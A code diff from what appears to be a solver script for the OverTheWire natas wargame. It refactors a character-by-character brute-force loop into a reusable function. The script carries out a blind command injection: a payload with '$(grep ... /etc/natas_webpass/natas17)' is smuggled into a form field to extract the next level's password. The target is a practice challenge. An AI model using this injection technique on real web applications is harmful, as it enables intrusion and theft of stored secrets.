@@ -167,6 +167,29 @@ def extract_php_code(source_soup: bs4.BeautifulSoup) -> pathlib.Path:
 
     return pathlib.Path(dir)
 
+def brute_force_post(website: str, key: str, query: str, username: str, password: str, check_func: typing.Callable) -> str:
+    char_set = [*(string.ascii_letters + string.digits)]
+
+    result = ""
+
+    while len(result) != 32:
+        print(f"\nConstructing : {result.ljust(32, '-')} ({len(result)/32*100:.02f}%)\n")
+
+        for char in tqdm(char_set):
+            cur_pass = result + char
+            
+            inject_response, inject_soup = send_post_request(website=website, data={key: query.format(data=cur_pass)}, username=username, password=password, verbose=False)
+
+            content = inject_soup.get_text(separator=" ")
+
+            if check_func(content):
+                result = cur_pass
+                break
+
+    print()
+
+    return result
+
 # code starts here
 response, soup = send_get_request(website=website, username=username, password=password)
 
@@ -179,23 +202,6 @@ php_path = extract_php_code(source_soup=source_soup)
 
 # format file with Ctrl+Shift+P > Format Document
 
-result = ""
-
-while len(result) != 32:
-    print(f"\nConstructing Password : {result.ljust(32, '-')} ({len(result)/32*100:.02f}%)\n")
-
-    for char in tqdm(char_set):
-        cur_pass = result + char
-        inject_query = f'$(grep -E ^{cur_pass}.* /etc/natas_webpass/natas{level+1})Africans'
-        
-        inject_response, inject_soup = send_post_request(website=website, data={"needle": inject_query}, username=username, password=password, verbose=False)
-
-        content = inject_soup.get_text(separator=" ")
-
-        if "Africans" not in content:
-            result = cur_pass
-            break
-
-print()
+result = brute_force_post(website=website, key="needle", query="$(grep -E ^{data}.* /etc/natas_webpass/natas17)Africans", username=username, password=password, check_func=lambda c: "Africans" not in c)
 
 password_dir = save_password(result=result)
